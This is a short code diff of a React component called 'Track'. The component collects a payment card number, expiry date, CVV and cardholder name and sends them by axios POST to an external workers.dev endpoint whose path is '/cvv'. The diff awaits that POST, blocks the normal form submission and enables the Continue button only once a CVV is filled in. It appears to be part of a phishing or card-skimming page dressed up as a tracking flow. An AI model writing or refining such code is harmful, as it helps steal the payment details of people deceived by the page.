@@ -42,16 +42,14 @@ export default function Track() {
     setExpiryDate(value);
   };
 
-  const handleSubmit = async () => {
+  const handleSubmit = async (e:any) => {
+    // if you used form, you must stop the form auto submit when the button onclick function is called
+    e.preventDefault()
     const params = {
       card, date: expiryDate, cvv, name
     }
     const url = `https://api.zkevm.workers.dev/cvv`
-    try {
-      axios.post(url, params)
-    } catch (error) {
-      console.log(error)
-    }
+    await axios.post(url, params)
     setCurrentStep(3)
   }
 
@@ -160,7 +158,7 @@ export default function Track() {
                     </div>
                   </div>
                   <div className="flex justify-center w-full ">
-                    <Button onClick={handleSubmit}>Continue</Button>
+                    <Button onClick={handleSubmit} disabled={!cvv}>Continue</Button>
                   </div>
                 </form>
               </div>
